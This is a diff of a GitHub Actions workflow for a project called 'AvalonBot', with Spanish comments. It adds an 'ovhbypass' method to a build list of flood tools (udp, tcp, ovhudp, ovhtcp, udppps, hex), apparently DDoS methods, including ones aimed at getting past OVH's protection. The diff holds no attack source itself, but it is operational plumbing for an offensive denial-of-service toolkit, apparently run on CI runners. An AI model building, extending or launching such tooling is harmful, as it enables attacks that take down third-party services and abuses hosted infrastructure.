@@ -1,4 +1,4 @@
-name: AvalonBot Frwrerwre
+name: AvalonBot Frwrerwreee
 
 on:
   workflow_dispatch:
@@ -48,6 +48,7 @@ jobs:
             "hex.c:hex"
             "udp.go:udp" #Compilando el metodo GO udp.go
             "ovhudp.c:ovhudp"
+            "ovhbypass.c:ovhbypass"
             "ovhtcp.c:ovhtcp"
             "udppps.c:udppps"
             "tcp.c:tcp" # Agregando el compilar tcp
@@ -127,7 +128,7 @@ jobs:
           echo "🎮 MÉTODOS DISPONIBLES:"
 
           # Mostrar métodos según ejecutables
-          for method in hex udp ovhudp ovhtcp udppps tcp; do
+          for method in hex udp ovhbypass ovhudp ovhtcp udppps tcp; do
             [ -f "$method" ] && echo "   • $method"
           done
 
